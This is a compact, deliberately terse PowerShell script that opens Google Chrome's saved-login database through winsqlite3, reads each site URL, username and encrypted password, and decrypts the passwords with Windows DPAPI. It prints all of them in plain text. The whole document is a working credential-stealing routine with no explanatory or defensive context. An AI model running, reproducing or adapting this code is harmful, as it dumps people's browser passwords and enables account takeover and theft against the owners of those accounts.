Add-Type -A System.Security
Add-Type 'using System.Runtime.InteropServices;using p=System.IntPtr;public class WinSQLite3{const string d="winsqlite3";[DllImport(d)]public static extern p sqlite3_open([MarshalAs(UnmanagedType.LPStr)]string f,out p d);[DllImport(d,EntryPoint="sqlite3_prepare16_v2")]public static extern p P(p d,[MarshalAs(UnmanagedType.LPWStr)]string l,int n,out p s,p t);[DllImport(d)]public static extern p sqlite3_step(p s);[DllImport(d,EntryPoint="sqlite3_column_text16")]static extern p C(p s,int i);[DllImport(d,EntryPoint="sqlite3_column_bytes")]static extern int Y(p s,int i);[DllImport(d,EntryPoint="sqlite3_column_blob")]static extern p L(p s,int i);public static string T(p s,int i){return Marshal.PtrToStringUni(C(s,i));}public static byte[] B(p s,int i){int l=Y(s,i);byte[] r=new byte[l];Marshal.Copy(L(s,i),r,0,l);return r;}}'
$l=[WinSQLite3]
$d=0
$_=$l::sqlite3_open($env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data',[ref]$d)
$s=0
$_=$l::P($d,"SELECT action_url,username_value,password_value FROM logins",-1,[ref]$s,0)
for(;!($l::sqlite3_step($s)%100)){$l::T($s,0)+","+$l::T($s,1)+","+[System.Text.Encoding]::ASCII.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($l::B($s,2),$null,1))}